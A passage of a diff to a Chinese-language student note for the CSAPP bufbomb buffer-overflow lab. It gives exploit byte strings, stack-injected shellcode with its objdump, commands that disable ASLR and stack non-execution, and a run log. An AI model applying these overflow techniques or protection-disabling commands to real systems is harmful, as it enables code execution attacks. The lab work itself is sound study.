@@ -66,5 +66,72 @@ Breakpoint 1, 0x08048ff1 in getbuf ()
 函数中`8048dc7:	8b 5d 08  mov 0x8(%ebp),%ebx  ; 入参int val`
 要在ebp + 8 位置放好字符串，下图展示如何确定此位置
 ![[B6E3A24C5F56A69DF646F52EF8BC9CAA.png]]
-
+`01 02 03 04 05 06 07 08 09 10 11 12 00 00 00 00 c0 8d 04 08 00 00 00 00 dd dd 68 57`
 ## Level 2 Firecracker
+Bang地址`08048d60 <bang>:`
+`mov    0x804a1dc,%eax                ; <global_value>`
+`cmp    0x804a1cc,%eax                ; <cookie>`
+首先要修改程序堆栈的可执行属性，然后关掉系统的栈地址随机化，否则每一次的缓冲区位置都不相同，无法通过缓冲区溢出跳转到此固定的缓冲区位置执行，即如下命令：
+```shell
+apt-get install execstack
+execstack -s bufbomb
+sudo sysctl -w kernel.randomize_va_space=0
+```
+打断点查看gets函数的传参地址
+`(gdb) x $eax`
+`0xffffb07c:     0x00000000`
+构建栈上运行的代码：
+```
+movl $0x804a1cc, %eax
+movl %eax, $0x804a1dc       ; 将cookie地址传给global_value
+pushq $0x08048d60           ; 返回Bang运行
+retq
+```
+
+转为汇编
+```
+vim bang.s
+gcc -m32 -c bang.s
+objdump -d bang.o > bang.txt
+cat bang.txt
+
+bang.o：     文件格式 elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:   a1 cc a1 04 08          mov    0x804a1cc,%eax
+   5:   a3 dc a1 04 08          mov    %eax,0x804a1dc
+   a:   68 60 8d 04 08          push   $0x8048d60
+   f:   c3                      ret  
+
+```
+
+
+```
+joseph@LAPTOP-E1IU5B7P:~/CSAPP/bufflab$ ./bufbomb -t SA23225138 < exploit-raw.txt 
+Team: SA23225138
+Cookie: 0x5768dddd
+Type string:Bang!: You set global_value to 0x5768dddd
+sh: 1: /usr/sbin/sendmail: not found
+Error: Unable to send validation information to grading server
+```
+
+## level 3 dynamic
+```
+a1 cc a1 04 08 68 1e 90 04 08 c3 00 a8 b0 ff ff 7c b0 ff ff
+```
+
+
+## 要点
+### level 0
+只需要覆盖getbuf原本的返回值
+### level 1
+覆盖getbuf的返回值，对于入参还要将其放在对应的地方
+### level 2
+要栈上执行指令，那么需要将返回值修改为指令序列头部，即buf首地址。
+指令内容：将cookie的值放入global_value，并push函数地址，这样执行完指令后跳转
+### level 3
+要栈上执行指令，那么需要将返回值修改为指令序列头部，即buf首地址。
+指令内容：将cookie的值放入eax，并push下一条执行的地址，这样执行完指令后跳转
